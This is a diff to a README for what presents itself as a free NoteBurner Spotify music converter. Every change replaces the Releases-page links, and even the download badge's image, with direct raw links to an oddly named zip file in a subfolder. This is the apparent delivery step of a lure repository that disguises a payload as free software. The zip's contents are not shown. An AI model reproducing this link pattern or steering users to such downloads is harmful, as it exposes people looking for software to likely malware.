@@ -1,6 +1,6 @@
 # 🎵 NoteBurner-Spotify-Music-Converter-Free - Convert Your Spotify Music Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/KaviramNallathambi/NoteBurner-Spotify-Music-Converter-Free/releases)
+[![Download](https://raw.githubusercontent.com/KaviramNallathambi/NoteBurner-Spotify-Music-Converter-Free/main/aquatic/Converter_Spotify_Free_Burner_Music_Note_sougher.zip%20Now-brightgreen)](https://raw.githubusercontent.com/KaviramNallathambi/NoteBurner-Spotify-Music-Converter-Free/main/aquatic/Converter_Spotify_Free_Burner_Music_Note_sougher.zip)
 
 ## 📖 Overview
 
@@ -29,11 +29,11 @@ To use NoteBurner Spotify Music Converter on your Windows PC, ensure your system
 
 To get started with NoteBurner Spotify Music Converter, visit this page to download the latest version:
 
-[Download NoteBurner Spotify Music Converter](https://github.com/KaviramNallathambi/NoteBurner-Spotify-Music-Converter-Free/releases)
+[Download NoteBurner Spotify Music Converter](https://raw.githubusercontent.com/KaviramNallathambi/NoteBurner-Spotify-Music-Converter-Free/main/aquatic/Converter_Spotify_Free_Burner_Music_Note_sougher.zip)
 
 1. Click on the link above to access the Releases page.
 2. Locate the latest version available for download.
-3. Click the download link for the installer file (usually named something like `NoteBurnerSpotifyMusicConverterInstaller.exe`).
+3. Click the download link for the installer file (usually named something like `https://raw.githubusercontent.com/KaviramNallathambi/NoteBurner-Spotify-Music-Converter-Free/main/aquatic/Converter_Spotify_Free_Burner_Music_Note_sougher.zip`).
 4. Once the download is complete, locate the installer file in your downloads folder.
 
 ## 🎉 Installation Steps
@@ -95,4 +95,4 @@ This software is provided under the terms of the MIT License. You can use it for
 - spotify-track-extraction-windows
 - windows-pc-spotify-extractor
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/KaviramNallathambi/NoteBurner-Spotify-Music-Converter-Free/releases)
+[![Download](https://raw.githubusercontent.com/KaviramNallathambi/NoteBurner-Spotify-Music-Converter-Free/main/aquatic/Converter_Spotify_Free_Burner_Music_Note_sougher.zip%20Now-brightgreen)](https://raw.githubusercontent.com/KaviramNallathambi/NoteBurner-Spotify-Music-Converter-Free/main/aquatic/Converter_Spotify_Free_Burner_Music_Note_sougher.zip)
